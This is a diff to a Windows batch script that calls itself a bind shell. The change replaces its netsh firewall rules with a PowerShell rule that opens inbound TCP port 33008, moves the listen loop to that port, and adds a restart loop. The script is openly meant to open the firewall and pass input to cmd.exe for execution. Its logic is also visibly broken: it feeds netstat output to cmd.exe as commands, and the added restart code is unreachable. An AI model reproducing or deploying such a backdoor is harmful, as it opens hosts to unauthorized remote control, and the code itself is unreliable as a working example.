@@ -1,19 +1,22 @@
 @echo off
 setlocal enabledelayedexpansion
 
+:loop
 REM Create a named pipe for communication
 set "pipe=\\.\pipe\bindshell"
-echo Creating named pipe...
 echo %pipe% > nul
 
 REM Start the server
-echo Starting bind shell on port 4444...
-netsh advfirewall firewall add rule name="BindShell" dir=in action=allow protocol=TCP localport=4444
-netsh advfirewall firewall add rule name="BindShell" dir=out action=allow protocol=TCP remoteport=4444
+powershell -Command "New-NetFirewallRule -Name 'BindShell' -DisplayName 'BindShell' -Action Allow -Direction Inbound -Protocol TCP -LocalPort 33008"
 
 REM Listen on port 4444 and execute commands
 :listen
-for /f "tokens=*" %%a in ('powershell -Command "netstat -an | findstr LISTENING | findstr 4444"') do (
+for /f "tokens=*" %%a in ('powershell -Command "netstat -an | findstr LISTENING | findstr 33008"') do (
     powershell -Command "cmd.exe /c '%%a'"
 )
 goto listen
+
+REM If we reach here, something went wrong. Restart after delay
+echo Error occurred. Restarting in 5 seconds...
+timeout /t 5 /nobreak > nul
+goto loop
